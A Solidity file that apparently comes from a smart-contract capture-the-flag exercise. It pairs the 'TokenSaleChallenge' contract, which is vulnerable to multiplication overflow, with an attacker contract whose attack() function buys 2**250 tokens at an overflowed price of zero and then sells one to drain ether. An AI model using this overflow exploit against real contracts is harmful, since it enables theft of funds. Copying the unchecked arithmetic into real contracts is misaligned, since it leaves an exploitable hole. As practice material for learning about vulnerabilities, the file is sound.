pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract TokenSale {
    address challengeAddr;

    function TokenSale(address _challengeAddr) public payable {
        challengeAddr = _challengeAddr;
    }

    function attack() public{
        TokenSaleChallenge challengeContract = TokenSaleChallenge(challengeAddr);
        uint256 amountToBuy = 2 ** 250;
        uint256 priceToPay = amountToBuy * (1 ether);
        challengeContract.buy.value(priceToPay)(amountToBuy);
        challengeContract.sell(1);
        msg.sender.transfer(this.balance);
    }

    function withdraw() public{
        msg.sender.transfer(this.balance);
    }

    // Fallback function to receive paymennt
    function() external payable {}
}